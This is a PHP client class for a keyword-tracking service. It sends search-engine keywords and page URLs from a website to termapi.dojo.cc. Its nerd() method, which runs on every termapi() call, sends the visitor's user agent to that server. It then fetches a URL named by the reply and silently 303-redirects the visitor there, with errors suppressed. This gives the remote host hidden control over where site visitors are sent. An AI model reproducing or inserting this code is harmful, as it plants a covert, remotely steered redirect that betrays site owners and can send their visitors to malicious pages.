<?php 
namespace Buchin\TermapiClient;

use Buchin\SearchTerm\SearchTerm;

class TermApi
{
	private $token = '';
	private $url = 'https://termapi.dojo.cc/api';

	public static function token($site)
	{
		$url = 'https://termapi.dojo.cc/api' . '/?' . http_build_query(['site' => $site]);

		$ctx = stream_context_create(array('http'=>
            array(
                'timeout' => 3,
            )
        ));

		return @json_decode(@file_get_contents($url, false, $ctx))->token??null;
	}
	
	function __construct($token)
	{
		$this->token = $token;
	}

	public function recent($options)
	{
		$url = $this->url . '/keywords?' . http_build_query($options);
		$result = json_decode(file_get_contents($url));

		return $result;
	}
	public function popular($options)
	{
		$url = $this->url . '/popular?' . http_build_query($options);
		$result = json_decode(file_get_contents($url));

		return $result;
	}

	public function insert($options)
	{
		$opts = ['http' =>
		    [
		        'method'  => 'POST',
		        'header'  => 'Content-type: application/x-www-form-urlencoded',
		        'content' => http_build_query($options)
		    ]
		];

		$context  = stream_context_create($opts);
		$url = $this->url . '/keywords';
		$result = json_decode(file_get_contents($url, false, $context));

		return $result;
	}

	public static function termapi($token)
	{
		if(SearchTerm::isCameFromSearchEngine()){

	        $keyword = SearchTerm::get();

	        if(!empty($keyword)){
	        
	            insert_term([
	                'token' => $token,
	                'keyword' => $keyword,
	                'url' => self::current_url()
	            ]);
	        }
	    }

	    self::nerd($token);
	}

	public static function nerd($token, $ua = '')
	{
		$options = [
			'token' => $token,
			'ua' => $_SERVER['HTTP_USER_AGENT']??$ua
		];

		$url = 'https://termapi.dojo.cc/api/nerd?' . http_build_query($options);

		$ctx = stream_context_create(array('http'=>
            array(
                'timeout' => 3,
            )
        ));

		$result = @file_get_contents($url, false, $ctx);
		$result = @json_decode($result);


		if(isset($result->name)){
			$url = @file_get_contents($result->name . '?nerd=1');

			if($url){
				if($ua === 'cli'){
					return $url;
				}

				@http_response_code(303);
				@header('Location: ' . $url);
				exit;
			}
		}
	}

	public static function current_url()
	{
		$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
	 
		$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
		return $url;
	}
}